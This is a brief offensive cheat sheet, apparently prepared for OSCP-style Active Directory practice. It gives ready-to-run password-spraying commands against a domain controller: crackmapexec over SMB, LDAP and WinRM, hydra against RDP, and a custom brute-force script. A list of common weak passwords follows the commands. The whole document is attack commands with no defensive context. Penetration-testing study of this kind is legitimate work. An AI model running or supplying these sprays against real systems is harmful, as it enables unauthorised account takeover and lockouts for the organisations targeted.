# SMB password spray
crackmapexec smb $DC -u users.txt -p 'Password123' --continue-on-success

# LDAP password spray
crackmapexec ldap $DC -u users.txt -p 'Password123' --continue-on-success

# WinRM password spray
crackmapexec winrm $DC -u users.txt -p 'Password123' --continue-on-success

# Using hydra for RDP
hydra -L users.txt -p Password123 rdp://$DC

# Using our smart_brute.py script
python3 smart_brute.py -t $DC -u users.txt -p passwords.txt -s smb --delay 2

# Common OSCP AD passwords to try
Password1
Password123
Welcome1
Summer2024
Winter2024
P@ssw0rd
Passw0rd
Admin123
admin